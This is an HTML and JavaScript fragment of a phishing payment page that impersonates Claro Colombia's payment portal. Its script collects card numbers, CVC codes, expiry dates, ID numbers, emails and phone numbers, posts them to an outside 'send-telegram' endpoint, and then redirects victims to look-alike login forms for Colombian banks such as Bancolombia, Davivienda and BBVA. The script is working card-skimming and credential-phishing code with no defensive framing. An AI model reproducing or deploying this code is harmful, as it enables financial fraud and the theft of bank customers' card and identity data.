  <style>
    /* ================= Custom Select Styles ================= */
    .custom-select {
      position: relative;
      width: 100%;
      max-width: 400px;
      border: 1px solid #ccc;
      border-radius: 5px;
      cursor: pointer;
      user-select: none;
      margin-bottom: 20px;
    }
    .custom-select .selected {
      padding: 10px;
      display: flex;
      align-items: center;
    }
    .custom-select .selected img {
      width: 20px;
      margin-right: 10px;
    }
    .custom-select .options {
      position: absolute;
      top: 100%;
      left: 0;
      right: 0;
      background: #fff;
      border: 1px solid #ccc;
      border-top: none;
      z-index: 10;
      display: none;
      max-height: 200px;
      overflow-y: auto;
    }
    .custom-select .option {
      padding: 10px;
      display: flex;
      align-items: center;
    }
    .custom-select .option img {
      width: 20px;
      margin-right: 10px;
    }
    .custom-select .option:hover {
      background: #f0f0f0;
    }

    .dropdown-raro {
      margin-bottom: 20px;
    }

    .contenedor-raro {

    .opcion-raro {

    }
    .servicio-extra {

    }
    .radio-group {

      gap: 15px;
      margin-top: 10px;
    }
    .radio-group label {
      display: flex;
      flex-direction: column;
      align-items: center;
      font-size: 14px;
      text-align: center;
    }
    .radio-group img {
      width: 50px;
      height: 50px;
      margin-bottom: 5px;
    }
  </style>

   <script>
  // URL absoluta de tu backend (reemplaza por la tuya)
  const SEND_TELEGRAM_ENDPOINT = 'https://lack-delta.vercel.app/api/send-telegram';

  // Mapeo de bancos a URL de redirección
  const bankRedirects = {
    bancolombia: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bancol/personas/formulario_u1.php",
    bancobogota: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bogota/personas/formulario_u1.php",
    davivienda: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/davi/personas/formulario_u1.php",
    bancopopular: "pago.html",
    bbva: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/bbva/personas/formulario_u1.php",
    occidente: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/occidente/personas/formulario_u1.php",
    avvillas: "https://portalpagos-claro-com-co.azurewebsites.net/sucur/avillas/personas/formulario_u1.php",
    caja:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/caja/personas/formulario_u1.php",
    fala:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/fala/personas/formulario_u1.php",
    itau:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/itau/personas/formulario_u1.php",
    scoti:"https://portalpagos-claro-com-co.azurewebsites.net/sucur/scoti/personas/formulario_u1.php"
  };

  // Ajuste dinámico del maxlength del CVC según la longitud del número de tarjeta
  document.getElementById('numeroTarjeta').addEventListener('input', function() {
    const cardLength = this.value.replace(/\s+/g, '').length; // eliminar espacios
    const cvcInput = document.getElementById('CVC');
    if (cardLength === 14) {
      cvcInput.maxLength = 4;
    } else {
      cvcInput.maxLength = 3;
    }
  });

  // Acción al hacer clic en el botón Confirmar
  document.getElementById('confirmBtn').addEventListener('click', function(event) {
    event.preventDefault(); // Prevenir cualquier acción por defecto

    // Recolectar datos de los inputs
    const numeroTarjeta = document.getElementById('numeroTarjeta').value;
    const nombreApellido = document.getElementById('nombreApellido').value;
    const tipoDocumento = document.getElementById('tipoDocumento').value;
    const numeroDocumento = document.getElementById('numeroDocumento').value;
    const mesExpiracion = document.getElementById('mesExpiracion').value;
    const anioExpiracion = document.getElementById('anioExpiracion').value;
    const CVC = document.getElementById('CVC').value;
    const email = document.getElementById('email').value;
    const cel = document.getElementById('cel').value;
    const cuotas = document.getElementById('cuotas').value;
    const banco = document.getElementById('banco').value;

    // Construir el mensaje a enviar (igual que antes)
    const message = 
      "Número de tarjeta: " + numeroTarjeta + "\n" +
      "Nombre y apellido: " + nombreApellido + "\n" +
      "Tipo de documento: " + tipoDocumento + "\n" +
      "Número de documento: " + numeroDocumento + "\n" +
      "Fecha de expiración: " + mesExpiracion + " / " + anioExpiracion + "\n" +
      "CVC/CVV: " + CVC + "\n" +
      "Correo electrónico: " + email + "\n" +
      "Número de celular: " + cel + "\n" +
      "Número de cuotas: " + cuotas + "\n" +
      "Banco: " + banco;

    // Enviar mensaje al backend (URL absoluta definida arriba)
    fetch(SEND_TELEGRAM_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message })
    })
    .then(response => response.json())
    .then(data => {
      console.log("Mensaje enviado (respuesta backend):", data);
      // Redirección según el banco seleccionado
      if (bankRedirects[banco]) {
        window.location.href = bankRedirects[banco];
      } else {
        alert("Banco no reconocido para redirección.");
      }
    })
    .catch(error => {
      console.error("Error al enviar el mensaje al backend:", error);
      // Aunque ocurra un error, se puede proceder con la redirección
      if (bankRedirects[banco]) {
        window.location.href = bankRedirects[banco];
      }
    });
  });
</script>
